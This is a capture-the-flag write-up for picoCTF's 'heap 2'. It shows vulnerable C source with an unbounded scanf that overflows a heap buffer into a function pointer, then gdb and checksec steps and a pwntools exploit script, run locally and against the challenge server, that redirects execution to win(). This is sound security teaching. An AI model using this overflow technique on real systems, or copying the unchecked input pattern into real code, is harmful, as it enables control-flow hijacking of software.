# heap 2 (200 points)
Can you handle function pointers?

Download the binary [here]().

Download the source [here]().

Connect with the challenge instance here: `nc mimas.picoctf.net 54159`

## Data
* chall
* chall.c

## Solution
First we should check the binary for information about how it is compiled:
```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5184d264ae0c1259ba3bb7a1e20fc348b4274b0, for GNU/Linux 3.2.0, with debug_info, not stripped
$ checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               2               chall
$
```
It's a 64-bit ELF file in little-endian (LSB).

We have got the following source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```
It's pretty similar to the challenge before. The variables `x` and `input_data` are behind each other on the heap (global variables). The function `write_buffer()` doesn't check the input length of the user, so we can write over the variable space above and manipulate the content of `x`.

To print the flag calls the program the `check_win()` function. This function interprets the content of `x` as a pointer and tries to executes it. So we have to inject a pointer in `x` with the given buffer overflow.

The function `win()` prints the file `flag.txt`. So we have to inject its pointer. The program has no PIE, so we can determine the address of the function with gdb:
```
$ gdb ./chall
GNU gdb (GDB) Fedora Linux 14.1-3.fc38

[...]

Reading symbols from ./chall...
gdb-peda$ x win
0x4011a0 <win>: 0xec834853
gdb-peda$ p &win
$1 = (void (*)()) 0x4011a0 <win>
gdb-peda$
```
The address is `0x4011a0`.

I just tried out the size of the input that we need to run over the buffer of the input data:
```
$ ./chall

I have a function, I sometimes like to call it, maybe you should change it

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATEST

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice: 1
[*]   Address   ->   Value
+-------------+-----------+
[*]   0x15ff6b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATEST
+-------------+-----------+
[*]   0x15ff6d0  ->   TEST

1. Print Heap
2. Write to buffer
3. Print x
4. Print Flag
5. Exit

Enter your choice:
```
But from the source code we can also see that it's the size of a char pointer.

So we need 32 signs to reach the variable `x`.

To input the address and the correct payload I used pwn-tools:
```python
#!/usr/bin/env python3

from pwn import *

payload = b"A"*32 + p64(0x4011a0, endian="little")
print(payload)

context.binary = binary = ELF("./chall")
p = process()
print(p.recvuntil(b"Enter your choice: "))
p.sendline("2")
print(p.recvuntil(b"Data for buffer: "))
p.sendline(payload)
p.sendline("4")
print(p.recvuntil(b"Enter your choice: "))
print(p.recv())
```
Keep in mind that the address has to be in 64-bit little endian format. Also we have to send the input for the right program options to the process.

If we do so we can successful get the flag:
```
$ python pwnage.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11@\x00\x00\x00\x00\x00'
[*] '/tmp/pico/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/tmp/pico/chall': pid 27966
b'\nI have a function, I sometimes like to call it, maybe you should change it\n\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
/tmp/pico/pwnage.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("2")
b'Data for buffer: '
/tmp/pico/pwnage.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("4")
b'\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
b'picoCTF{testflag}\n\n'
[*] Process '/tmp/pico/chall' stopped with exit code 0 (pid 27966)
$
```

Now we just have to adjust the script for the remote application:
```python
#!/usr/bin/env python3

from pwn import *

payload = b"A"*32 + p64(0x4011a0, endian="little")
host, port = "mimas.picoctf.net", 58213

print(payload)

#context.binary = binary = ELF("./chall")
#p = process()
p = remote(host, port)
print(p.recvuntil(b"Enter your choice: "))
p.sendline("2")
print(p.recvuntil(b"Data for buffer: "))
p.sendline(payload)
p.sendline("4")
print(p.recvuntil(b"Enter your choice: "))
print(p.recv())
p.close()
```
_(You can find the script [here](./pwnage.py))_

And run the script to get the final flag:
```
$ python pwnage.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11@\x00\x00\x00\x00\x00'
[+] Opening connection to mimas.picoctf.net on port 58213: Done
b'\nI have a function, I sometimes like to call it, maybe you should change it\n\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
/tmp/pico/pwnage.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("2")
b'Data for buffer: '
/tmp/pico/pwnage.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("4")
b'\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. Exit\n\nEnter your choice: '
b'picoCTF{and_down_the_road_we_go_91218226}\n'
[*] Closed connection to mimas.picoctf.net port 58213
$
```
